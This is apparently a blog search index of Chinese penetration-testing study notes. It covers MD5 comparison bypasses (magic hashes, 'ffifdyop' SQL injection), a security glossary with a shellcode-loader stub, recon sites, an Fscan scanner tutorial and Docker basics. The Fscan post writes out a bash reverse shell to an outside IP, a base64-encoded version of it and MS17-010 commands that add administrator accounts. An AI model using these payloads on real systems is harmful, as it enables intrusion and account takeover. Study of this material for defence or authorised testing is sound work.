<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>MD5 绕过的一些思路</title>
      <link href="/2023/10/19/MD5%20%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/"/>
      <url>/2023/10/19/MD5%20%E7%BB%95%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E6%80%9D%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1>MD5 绕过的一些思路</h1><h2 id="常用的0e绕过">常用的0e绕过</h2><blockquote><p>0e开头的字符串在参与比较时,会被当做科学计数法,结果转换为0</p></blockquote><ul><li>QNKCDZO</li><li>240610708</li><li>s878926199a</li><li>s155964671a</li><li>s214587387a</li><li>s214587387a</li><li>s1091221200a</li><li>byGcY</li><li>sonZ7y</li><li>aabg7XSs</li><li>aabC9RqS</li></ul><p>这些字符串的 md5 值都是 0e 开头，在 php 弱类型比较中判断为相等</p><h2 id="数组绕过">数组绕过</h2><blockquote><p>md5不能加密数组,传入数组会报错,但会继续执行并且返回结果为null</p></blockquote><p>比如将两个数组的md5值进行比较</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">a[]=a&amp;b[]=b <br><span class="hljs-title function_ invoke__">md5</span>(a[]=<span class="hljs-number">1</span>) === <span class="hljs-title function_ invoke__">md5</span>(b[]=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>由于md5函数无法处理数组,会返回null,所以md5加密后的结果是下面这样</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-literal">null</span> === <span class="hljs-literal">null</span><br></code></pre></td></tr></table></figure><p>结果返回true,也就是说数组的md5值进行比较时,结果相等</p><p>需要注意的是0e绕过只能绕过弱类型比较(==),而数组绕过不只可以绕过弱类型比较,还可以绕过强类型比较(===)</p><h2 id="MD5与SQL注入">MD5与SQL注入</h2><p>可以了解一下MySQL中的一些数值比较特征。</p><ol><li><p>当数字和字符串比较时，若字符串的数字部分（需要从头开始）和数字是相同的，那么则返回的是true。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select if(1=&quot;1a&quot;,&quot;相等&quot;,&quot;不相等&quot;) as test;<br></code></pre></td></tr></table></figure><p>if（exp1,stat1,stat2）:类似于高级语言中三元运算符。当exp1为true的是否返回stat1，为false返回stat2</p></li><li><p>以数字开头的字符串，若开头的字符不是0，那么在做逻辑运算的时候返回的是1，也就是true。</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from user where password =&#x27;&#x27;or&#x27;1234a&#x27;;<br></code></pre></td></tr></table></figure><!--"1234a"会被当做true对待。而任何数和true做逻辑或运算返回的值都是true。--><p>md5($password,true)的漏洞</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs mysql">select * from usera where username = &#x27;admin&#x27; and password = md5($pass,true)<br></code></pre></td></tr></table></figure><p>对特殊的<strong>字符串</strong>进行md5后能够与 &quot;or&quot;加上一个非0的字符就可以绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ffifdyop<br></code></pre></td></tr></table></figure><p>ffifdyop的MD5加密结果是 276f722736c95d99e921722cf9ed621c</p><p>经过MySQL编码后会变成’or’6xxx,使SQL恒成立,相当于万能密码,可以绕过md5()函数的加密</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安术语_术语</title>
      <link href="/2023/08/11/%E7%BD%91%E5%AE%89%E6%9C%AF%E8%AF%AD_%E6%9C%AF%E8%AF%AD/"/>
      <url>/2023/08/11/%E7%BD%91%E5%AE%89%E6%9C%AF%E8%AF%AD_%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<blockquote><p>安全术语你得知道些吧！</p><p>他们之间有什么区别和联系呢？</p></blockquote><h1>POC</h1><p>POC（Proof of Concept）漏洞验证。即通过一段说明或者一个攻击的样例,使得能够确认这个漏洞是真实存在的。（<strong>侧重于验证是否存在</strong>） 如，我们在验证站点是否存在xss漏洞时，常用下面命令来验证。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">&lt;script&gt;alert(&#x27;94&#x27;)&lt;/script&gt;  <br></code></pre></td></tr></table></figure><p>这便是最简单常用的poc。</p><h1>EXP</h1><p>EXP（Exploit）漏洞利用是指由攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞,所进行的攻击行为。攻击者使用渗透攻击去入侵系统时,往往会造成开发者所没有预期到的一种特殊结果。流行的渗透攻击技术包括缓冲区溢出、web应用程序漏洞攻击(比如代码执行、命令执行),及利用配置错误等。通常所说的EXP即一段对漏洞如何利用的详细说明或者一个演示的漏洞攻击代码,（<strong>意味着该漏洞存在并有公开的利用方式</strong>）可以使得读者完全了解漏洞的机理以及利用的方法。如，之前宝塔pma漏洞，永恒之蓝等漏洞的利用脚本。</p><h1>Payload</h1><p>Payload(攻击载荷)是我们期望目标系统在被渗透攻击之后去执行的代码,在Metasploit框架中可以自由地选择、传送和植入。例如,反弹式shel是种从目标主机到攻击主机创建网络连接,并提供 Windows命令行She的攻击载荷,而 bindshel攻击载荷则在目标主机上将命令行she绑定到打开的监听端口,攻击者可以连接这些端口来取得shel交互。攻击载荷也可能是简单的在目标操作系统上执行一些命令,如添加用户账号等。如，我们利用msf或cs生成的各种平台的shell，通常就是指Payload。</p><h1>Shellcode</h1><p>shellcode是一小段代码，用于利用软件漏洞作为有效载荷。它之所以被称为“shellcode”，是因为它通常启动一个命令shell，攻击者可以从这个命令shell控制受损的计算机，但是执行类似任务的任何代码都可以被称为shellcode。因为有效载荷（payload）的功能不仅限于生成shell。简单来说：shellcode为16进制的机器码，是一段执行某些动作的机器码。如通常我们利用加载shellcode的方法来逃逸安全软件的查杀。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">#include &lt;Windows.h&gt;<br>#include &lt;stdio.h&gt;<br>unsigned char buf[] =<br>&quot;你的shellcode&quot;;<br>#pragma comment(linker, &quot;/subsystem:\&quot;Windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;)<br>//windows控制台程序不出黑窗口<br>int main()<br>&#123;<br> ((void(*)(void)) &amp; buf)();<br>&#125;<br></code></pre></td></tr></table></figure><h1>0Day</h1><p>0Day即零日漏洞或零时差漏洞(zero- dayexploit)通常是指还没有补丁的安全漏洞,零日攻击或零时差攻击(英语zero- dayattack)则是指利用这种漏洞进行的攻击。提供该漏洞细节或者利用程序的人通常是该漏洞的发现者。零日漏洞的利用程序对网络安全具有巨大威胁,因此零日漏洞不但是黑客的最爱,掌握多少零日漏洞也成为评价黑客技术水平的一个重要参数。如之前提到过的Java反序列化漏洞、OpenSSL心脏滴血漏洞、永恒之蓝、以及国内很多CMS的漏洞（dedecms phpcms等）</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>信息收集_wn</title>
      <link href="/2023/08/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_wn/"/>
      <url>/2023/08/11/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86_wn/</url>
      
        <content type="html"><![CDATA[<h1>信息收集</h1><p><strong>信息收集是指通过各种方式获取所需要的信息，比如IP、中间件、脚本语言、端口、邮箱、域名、企业等资产信息以及相应端口/服务、指纹、敏感信息、社工碰撞等易受攻击面信息。</strong></p><h2 id="信息收集分类">信息收集分类</h2><blockquote><p>从信息收集方式分类可将信息收集分为两大类：主动信息收集、被动信息收集。</p></blockquote><h3 id="主动信息收集">主动信息收集</h3><p>与目标<strong>直接交互</strong>，通过主动扫描目标主机或网站，对目标进行探测性扫描获取相关信息。获取到的信息更为准确、信息更多。容易留下明显的攻击访问痕迹（记录自己的操作信息），易发现和被溯源。</p><h3 id="被动信息收集">被动信息收集</h3><p>通过<strong>搜索引擎</strong>、<strong>社会工程</strong>等方式间接等公开渠道进行相关信息的检索收集信息。</p><h2 id="信息收集目标和方法">信息收集目标和方法</h2><h3 id="域名信息">域名信息</h3><h4 id="Whois">Whois</h4><blockquote><p>在线网站和邮箱反查</p></blockquote><p>注册域名的时候留下的信息。比如域名注册人的邮箱、电话号码、姓名等。根据这些信息可以尝试制作社工密码，或者查出更多的资产等等，也可以反查注册人，邮箱，电话，机构及更多的域名。</p><h5 id="在线网站查询链接">在线网站查询链接</h5><p>站长之家查询接口：<a href="https://whois.chinaz.com/">https://whois.chinaz.com/</a></p><p>阿里云查询接口：<a href="https://whois.aliyun.com/">https://whois.aliyun.com/</a></p><p>腾讯云查询接口：<a href="https://whois.cloud.tencent.com/">https://whois.cloud.tencent.com/</a></p><p>全球whois查询：<a href="https://www.whois365.com/cn/">https://www.whois365.com/cn/</a></p><p>中国互联网信息中心：<a href="https://webwhois.cnnic.cn/WelcomeServlet">https://webwhois.cnnic.cn/WelcomeServlet</a></p><p>爱网站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a></p><p>IANA WHOIS Service：<a href="https://www.iana.org/whois">https://www.iana.org/whois</a></p><h5 id="反查邮箱链接">反查邮箱链接</h5><p>whois反查：<a href="https://www.benmi.com/rwhois">https://www.benmi.com/rwhois</a></p><p>福步：<a href="https://bbs.fobshanghai.com/checkemail.html">https://bbs.fobshanghai.com/checkemail.html</a></p><p>站长工具：<a href="http://whois.chinaz.com/reverse?ddlSearchMode=1">http://whois.chinaz.com/reverse?ddlSearchMode=1</a></p><p>phonebook：<a href="https://phonebook.cz">https://phonebook.cz</a></p><p>hunter：<a href="https://hunter.io/">https://hunter.io/</a></p><h4 id="搜索引擎查找">搜索引擎查找</h4><h5 id="特定语法搜索">特定语法搜索</h5><p>谷歌、百度、搜狗、360、bing等hack搜索语法搜索</p><p>Google：<a href="https://www.google.com">https://www.google.com</a>   语法：intitle=公司名称；site:xxxx.com<br>百度：<a href="https://www.baidu.com">https://www.baidu.com</a>   语法：intitle=公司名称;site:xxxx.com<br>搜狗：<a href="https://www.sogou.com/">https://www.sogou.com/</a><br>360：<a href="https://www.so.com/">https://www.so.com/</a><br>Bing：<a href="https://cn.bing.com/">https://cn.bing.com/</a></p><h5 id="空间测绘搜索引擎语法">空间测绘搜索引擎语法</h5><p>fofa：<a href="https://fofa.info/toLogin">https://fofa.info/toLogin</a></p><p>鹰图：<a href="https://hunter.qianxin.com/">https://hunter.qianxin.com/</a></p><p>quake：<a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></p><p>钟馗之眼：<a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></p><p>Shodan：<a href="https://www.shodan.io/">https://www.shodan.io/</a></p><h4 id="第三方查询">第三方查询</h4><p>国外有一些第三方应用提供了子域名查询功能</p><ul><li>DNSDumpster</li><li>Virustotal</li><li>CrtSearch</li><li>threatminer</li><li>Censys</li></ul><h4 id="网站信息利用">网站信息利用</h4><p>在网站中可以根据网站本身的功能特点收集网站本身、各项安全策略、设置等可能暴露泄漏出的一些信息。</p><p>网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在JavaScript文件、资源文件链接等位置。</p><p>网站的安全策略如跨域策略、CSP规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个SSL/TLS证书，因此有时可通过证书来获取相关域名信息。</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>内网扫描器Fscan</title>
      <link href="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/"/>
      <url>/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/</url>
      
        <content type="html"><![CDATA[<h1>简介</h1><blockquote><ul><li>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。</li><li>支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</li></ul></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">下载地址：https://github.com/shadow1ng/fscan<br></code></pre></td></tr></table></figure><h1>主要功能</h1><h2 id="1-信息搜集">1.信息搜集</h2><ul><li>存活探测(icmp)</li><li>端口扫描</li></ul><h2 id="2-爆破功能">2.爆破功能:</h2><ul><li>各类服务爆破(ssh、smb、rdp等)</li><li>数据库密码爆破(mysql、mssql、redis、psql、oracle等)</li></ul><h2 id="3-系统信息、漏洞扫描">3.系统信息、漏洞扫描</h2><ul><li>netbios探测、域控识别</li><li>获取目标网卡信息</li><li>高危漏洞扫描(ms17010等)</li></ul><h2 id="4-Web探测功能">4.Web探测功能:</h2><ul><li>webtitle探测</li><li>web指纹识别(常见cms、oa框架等)</li><li>web漏洞扫描(weblogic、st2等,支持xray的poc)</li></ul><h2 id="5-漏洞利用">5.漏洞利用:</h2><ul><li>redis写公钥或写计划任务</li><li>ssh命令执行</li><li>ms17017利用(植入shellcode),如添加用户等</li></ul><h2 id="6-其他功能">6.其他功能:</h2><ul><li>文件保存</li></ul><h1>使用方法</h1><h2 id="完整参数"><strong>完整参数</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-c string      #ssh命令执行  <br>-cookie string  #设置cookie  <br>-debug int     #多久没响应,就打印当前进度(default 60)  <br>-domain string    #smb爆破模块时,设置域名  <br>-h string          #目标ip: 192.168.11.11 | 192.168.11.11-255 |192.168.11.11,192.168.11.12  <br>-hf string        #读取文件中的目标  <br>-hn string        #扫描时,要跳过的ip: -hn 192.168.1.1/24  -m string         #设置扫描模式: <br>-m ssh (default &quot;all&quot;)  <br>-no            #扫描结果不保存到文件中  <br>-nobr            #跳过sql、ftp、ssh等的密码爆破  <br>-nopoc          #跳过web poc扫描  <br>-np            #跳过存活探测  <br>-num int         #web poc 发包速率  (default 20)  <br>-o string          #扫描结果保存到哪 (default &quot;result.txt&quot;) <br>-p string          #设置扫描的端口: 22 | 1-65535 | 22,80,3306 (default &quot;21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017&quot;)  <br>-pa string        #新增需要扫描的端口,-pa 3389 (会在原有端口列表基础上,新增该端口)  <br>-path string      #fcgi、smb romote file path  <br>-ping            #使用ping代替icmp进行存活探测  <br>-pn string        #扫描时要跳过的端口,as: -pn 445  <br>-pocname string   #指定web poc的模糊名字, -pocname weblogic <br>-proxy string     #设置代理, -proxy http://127.0.0.1:8080  <br>-user string      #指定爆破时的用户名  <br>-userf string     #指定爆破时的用户名文件  <br>-pwd string       #指定爆破时的密码  <br>-pwdf string      # 指定爆破时的密码文件  <br>-rf string        #指定redis写公钥用模块的文件 (as: -rf id_rsa.pub)  <br>-rs string         #redis计划任务反弹shell的ip端口 (as: -rs 192.168.1.1:6666)  <br>-silent          #静默扫描,适合cs扫描时不回显  <br>-sshkey string    #ssh连接时,指定ssh私钥  <br>-t int          #扫描线程 (default 600)  <br>-time int          #端口扫描超时时间 (default 3)  <br>-u string          #指定Url扫描  <br>-uf string        #指定Url文件扫描  <br>-wt int          #web访问超时时间 (default 5)  <br>-pocpath string  #指定poc路径  <br>-usera string   #在原有用户字典基础上,新增新用户  <br>-pwda string    #在原有密码字典基础上,增加新密码  <br>-socks5       #指定socks5代理 (as: -socks5  socks5://127.0.0.1:1080)  <br>-sc         #指定ms17010利用模块shellcode,内置添加用户等功能 (as: -sc add)<br></code></pre></td></tr></table></figure><h2 id="简单使用"><strong>简单使用</strong></h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">fscan.exe -h [IP] #默认使用全部模块fscan.exe -h 192.168.1.1/16 #扫描B段fscan.exe -h 192.168.x.x -h 192.168.1.1/24 //C段fscan.exe -h 192.168.x.x -h 192.168.1.1/16 //B段fscan.exe -h 192.168.x.x -h 192.168.1.1/8  //A段的192.x.x.1和192.x.x.254,方便快速查看网段信息<br></code></pre></td></tr></table></figure><p><img src="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/image-20230523092542013.png" alt="image-20230523092542013"></p><p><strong>加上netbios模块才会显示netbios的信息</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m netbios<br></code></pre></td></tr></table></figure><h3 id="以文件进行导入扫描">以文件进行导入扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -hf “路径”<br>.\fscan64.exe -hf .\ip.txt<br>\#可以使用相对位置，也可以使用绝对位置<br></code></pre></td></tr></table></figure><h3 id="跳过相应IP进行扫描">跳过相应IP进行扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.1/24<br></code></pre></td></tr></table></figure><h3 id="对url进行扫描">对url进行扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -u http://baidu.com<br># -uf 对指定文件内的URL进行扫描<br></code></pre></td></tr></table></figure><h3 id="设置代理扫描">设置代理扫描</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.1/24  -proxy http://127.0.0.1:8080<br></code></pre></td></tr></table></figure><h1>爆破功能</h1><h2 id="爆破使用">爆破使用</h2><p>爆破功能简单使用的话直接使用即可默认调用，输入如下命令它会自动爆破扫描出来的服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP<br></code></pre></td></tr></table></figure><h2 id="对模块进行自定义文件爆破">对模块进行自定义文件爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h [IP] -m [模块] -p [模块对应的端口] -pwdf [密码文件] -userf [用户名文件]<br></code></pre></td></tr></table></figure><p>-m的模块包含：</p><ul><li>[mssql] [ms17010] [all] [portscan] [ftp] [smb] [netbios] [oracle] [redis]</li><li>[fcgi] [mem] [web] [ssh] [findnet] [icmp] [main] [rdp] [mgo] [cve20200796]</li><li>[webonly] [mysql] [psql]</li></ul><p>对ssh模块进行爆破，并设置自定义文件爆破：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -m ssh -p 22 -pwdf .\pwd.txt -userf .\users.txt<br></code></pre></td></tr></table></figure><p>-pwdf 、-userf 同样也是相对位置和绝对位置都可以使用。</p><p>注：在进行爆破的时候是按文件里面的顺序进行爆破的，这时ssh包含多个用户，只能爆破出来第一个，要把root类的管理权限高的用户名放在文本得最上面。</p><p>附加一个扫mysql服务的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -m mysql -np -nopoc<br></code></pre></td></tr></table></figure><p><img src="/2023/05/23/%E5%86%85%E7%BD%91%E6%89%AB%E6%8F%8F%E5%99%A8Fscan/image-20230523093704209.png" alt="image-20230523093704209"></p><p>使用navicat连接</p><p>连接的前提：你目标机要开启远程连接，</p><p>mysql开启远程连接：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">grant all privileges on *.* to &#x27;root&#x27;@&#x27;%&#x27; identified by &#x27;123456&#x27; with grant option;#开启一个远程连接用户为root任意IP可以连接，密码时123456<br>flush privileges;#刷新用户权限<br>select user,host from user;#查看用户检查是否已经更改<br></code></pre></td></tr></table></figure><h2 id="跳过一些扫描进行爆破">跳过一些扫描进行爆破</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-nobr #跳过sql、ftp、ssh等爆破<br>-nopoc #跳过web poc扫描<br>-np #跳过存活检测<br></code></pre></td></tr></table></figure><h1>漏洞利用功能</h1><h2 id="使用ssh命令执行">使用ssh命令执行</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h [目标IP] -c [执行的命令]<br></code></pre></td></tr></table></figure><p>例如：</p><p>查看用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h IP -c whoami<br></code></pre></td></tr></table></figure><h2 id="ssh命令执行上线Necat">ssh命令执行上线Necat</h2><p>例如：</p><p>执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">bash -i &gt;&amp; /dev/tcp/192.168.0.120/5555 0&gt;&amp;1<br></code></pre></td></tr></table></figure><p>编码后执行的命令（因为在powershell中执行的命令不能包含&amp;&amp;和&amp;）：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.130  -c &quot;bash -c &#x27;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjAuMTIwLzU1NTUgMD4mMQo=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;&quot;<br></code></pre></td></tr></table></figure><p>注：<strong>若命令有变</strong>只需要<strong>将变化后执行的命令</strong>进行base64编码后，对上述<strong>编码后执行的命令</strong>中的base64编码进行替换即可。</p><h2 id="MS17-010模块利用">MS17-010模块利用</h2><p>添加用户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc add<br></code></pre></td></tr></table></figure><p>执行此命令后会生成一个用户，用户名：sysadmin 密码：1qaz@WSX!@#4</p><p>启用guest用户，并把guest用户添加到管理员组</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">.\fscan64.exe -h 192.168.88.141 -m ms17010 -sc guest<br>#启用后用户是guest 密码：1qaz@WSX!@#4<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 命令 </tag>
            
            <tag> 工具 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2023-21839 weblogicRCE漏洞复现</title>
      <link href="/2023/04/19/CVE-2023-21839-weblogicRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/04/19/CVE-2023-21839-weblogicRCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1>CVE-2023-21839 weblogicRCE漏洞复现</h1><h1>影响范围</h1><ul><li><p>weblogic_server = 12.2.1.3.0</p></li><li><p>weblogic_server = 12.2.1.4.0</p></li><li><p>weblogic_server = 14.1.1.1.0</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>docker学习</title>
      <link href="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/04/03/docker%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1>Docker</h1><h2 id="概述">概述</h2><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/docker.png" alt="img"></p><blockquote><p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。</p><p>是一种轻量级的“虚拟机”</p><p>在Linux容器里运行应用的开源工具</p><p><strong>Docker的官网地址</strong>：<a href="https://www.docker.com/">https://www.docker.com/</a></p></blockquote><h3 id="docker的基本组成">docker的基本组成</h3><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/1.png" alt="img"></p><ul><li><p>镜像（image）：docker镜像就好比是一个模板，可以通过这个模板来创建容器服务，tomcat镜像—&gt;run----&gt;tomcat01容器（提供服务），通过这个镜像可以创建多个容器（最终服务运行或者项目运行就是在容器中运行的）。</p></li><li><p>容器（container）：docker利用容器技术，独立运行一个或者一组应用，通过镜像来创建的，启动、停止、删除、基本命令，目前就可以把这个容器理解为就是一个简易的Linux系统。</p></li><li><p>仓库（repository）：仓库就是存放镜像的地方，仓库分为公有仓库和私有仓库，Docker Hub（默认是国外的）、阿里云…都有容器服务器（配置镜像加速）</p></li></ul><h2 id="安装">安装</h2><blockquote><p>环境</p></blockquote><p>==<strong>我使用的是Linux centos</strong>==</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"># <span class="hljs-number">1.</span> 卸载就得版本<br>yum remove docker \<br>                  docker-client \<br>                  docker-client-latest \<br>                  docker-common \<br>                  docker-latest \<br>                  docker-latest-logrotate \<br>                  docker-logrotate \<br>                  docker-engine<br>                  <br># <span class="hljs-number">2.</span> 安装依赖环境<br>yum install -y yum-utils<br><br># <span class="hljs-number">3.</span> 设置镜像的仓库<br>yum-config-manager \<br>    --add-repo \<br>    https:<span class="hljs-comment">//download.docker.com/linux/centos/docker-ce.repo #  默认是国外的！</span><br>    <br>yum-config-manager \<br>    --add-repo \   <br>    http:<span class="hljs-comment">//mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</span><br>    <br>yum-config-manager --add-repo http:<span class="hljs-comment">//mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo # 推荐使用 阿里云镜像</span><br><br># <span class="hljs-number">4.</span> 更新软件包的索引<br>yum makecache fast<br><br># <span class="hljs-number">5.</span> 安装最新版的 docker 引擎， docker-ce 社区版  ee 企业版 （也可以指定安装不停的版本）<br>yum install docker-ce docker-ce-cli containerd.io  <br><br># <span class="hljs-number">6.</span> 启动 docker<br>systemctl start docker<br><br># <span class="hljs-number">7.</span> 使用 docker version 查看是否启动成功<br>docker version<br><br># <span class="hljs-number">8.</span> 启动一个镜像<br>docer run hello-world<br><br># <span class="hljs-number">9.</span> 查看下载好的镜像<br>docker images<br></code></pre></td></tr></table></figure><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404092935922.png" alt="image-20230404092935922"></p><p><strong>设置镜像仓库</strong></p><p>yum-config-manager --add-repo <a href="http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo">http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo</a></p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404094614550.png" alt="image-20230404094614550"></p><p><strong>启动信息</strong></p><p>systemctl start docker</p><p>docker version</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404094737236.png" alt="image-20230404094737236"></p><p><strong>卸载docke</strong></p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"># 两个步骤完成卸载<br>Uninstall Docker Engine<br>Uninstall the Docker Engine, CLI, and Containerd packages:<br><br># <span class="hljs-number">1.</span> 卸载 docker 一些依赖<br>yum remove docker-ce docker-ce-cli containerd.io<br><br>Images, containers, volumes, or customized configuration files on your host are not automatically removed. To <span class="hljs-built_in">delete</span> all images, containers, and volumes:<br><br># <span class="hljs-number">2.</span> 删除目录，卸载资源<br>rm -rf /<span class="hljs-keyword">var</span>/lib/docker<br><br># <span class="hljs-number">3.</span> docker 的默认工作路径<br>/<span class="hljs-keyword">var</span>/lib/docker<br><br>You must <span class="hljs-built_in">delete</span> any edited configuration files manually.<br></code></pre></td></tr></table></figure><h2 id="docker常用命令">docker常用命令</h2><h3 id="帮助命令">帮助命令</h3><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go">docker version # 显示 docker 的版本信息<br><br>docker info    # 显示 docker 的系统信息，包括镜像 和 容器的数量<br><br>docker 命令 --help # 帮助命令<br></code></pre></td></tr></table></figure><h3 id="镜像命令">镜像命令</h3><p><strong>（搜索，下载，删除，查看）</strong></p><p><strong>docker images</strong> 查看所有本地主机上的镜像</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404095208452.png" alt="image-20230404095208452"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext"># 解释<br>REPOSITORY  镜像的仓库源<br>TAG    镜像的标签<br>IMAGE ID    镜像的 ID<br>CREATED     镜像的创建时间<br>SIZE        镜像的大小<br><br># 可选项<br>-a，--all   # 列出所有镜像<br>-q，--quiet # 只显示镜像的 id<br></code></pre></td></tr></table></figure><p><strong>docker search</strong> 搜索镜像</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404095333371.png" alt="image-20230404095333371"></p><p>–filter STARS=3000  <!--搜索出来的镜像的--></p><p>例 docker search mysql --filter STARS=300</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404095449893.png" alt="image-20230404095449893"></p><p><strong>docker pull</strong> 下载镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">docker pull 镜像名[:tag]<br></code></pre></td></tr></table></figure><p>docker pull mysql</p><p>我已经下载过啦</p><p><img src="/2023/04/03/docker%E5%AD%A6%E4%B9%A0/image-20230404100757826.png" alt="image-20230404100757826"></p><p><a href="http://docker.io/library/mysql:latest">docker.io/library/mysql:latest</a>  # 真实地址</p><p>也可以</p><p>docker pull <a href="http://docker.io/library/mysql:latest">docker.io/library/mysql:latest</a></p><p>2个等价的</p><p>指定版本下载（官方文档指定）</p><p>docker pull mysql:5.7</p><p><strong>docker rmi</strong> 删除镜像</p><figure class="highlight go"><table><tr><td class="code"><pre><code class="hljs go"># 根据 ID 删除，也可以同时指定多个 ID<br>docker rmi -f  IMAGE ID,IMAGE ID,IMAGE ID<br><br># 递归删除所有镜像<br>docker rmi -f $(docker images -aq)<br></code></pre></td></tr></table></figure><h3 id="容器命令">容器命令</h3><p><strong>有了镜像，才可以创建容器，linux，下载一个 